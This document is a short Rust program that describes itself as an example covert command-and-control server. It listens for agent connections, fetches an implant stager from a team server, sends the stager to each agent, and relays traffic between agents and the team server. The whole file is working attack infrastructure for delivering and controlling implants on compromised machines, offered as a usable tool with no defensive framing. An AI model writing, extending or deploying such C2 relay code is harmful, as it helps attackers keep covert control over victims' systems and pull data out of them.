use clap::Parser;
use covert_server::{CSFrameRead, CSFrameWrite};
use tokio::{
    net::{TcpListener, TcpStream},
    task, try_join,
};

#[derive(Parser, Debug)]
#[clap(name = "covert_server")]
#[clap(author = "Matthew \"Oscar\" Howard")]
#[clap(version = "1.0")]
#[clap(about = "Start the example covert c2 server", long_about = None)]
struct Args {
    #[clap(long, default_value_t = String::from("localhost:2222"), value_parser)]
    ts: String,
    #[clap(long, default_value_t = String::from("0.0.0.0:5555"), value_parser)]
    bind: String,
}

#[tokio::main]
async fn main() {
    if let Err(e) = try_join!(agent_server_task()) {
        println!("{}", e);
    };
}

async fn agent_server_task() -> Result<(), Box<dyn std::error::Error>> {
    let args: Args = Args::parse();
    let listener = TcpListener::bind(&args.bind).await?;
    println!(
        "Running...\nListening: {}\nTeam Server: {}",
        args.bind, args.ts
    );
    loop {
        let ts_addr = args.ts.clone();
        let (stream, _) = listener.accept().await?;
        task::spawn(async move {
            if let Err(e) = handle_agent_connection(stream, &ts_addr).await {
                println!("connection error: {}", e);
            };
        });
    }
}

async fn handle_agent_connection(
    mut agent_conn: TcpStream,
    ts_addr: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let (implant, mut ts_conn) =
        covert_server::start_implant_session(&ts_addr, "x64", "mypipe").await?;
    agent_conn.write_frame(&implant).await?;
    println!("Got stager from ts, bytes:{}", implant.len());
    loop {
        let data_from_agent = agent_conn.read_frame().await?;
        ts_conn.write_frame(&data_from_agent).await?;
        let data_from_ts = ts_conn.read_frame().await?;
        agent_conn.write_frame(&data_from_ts).await?;
    }
}
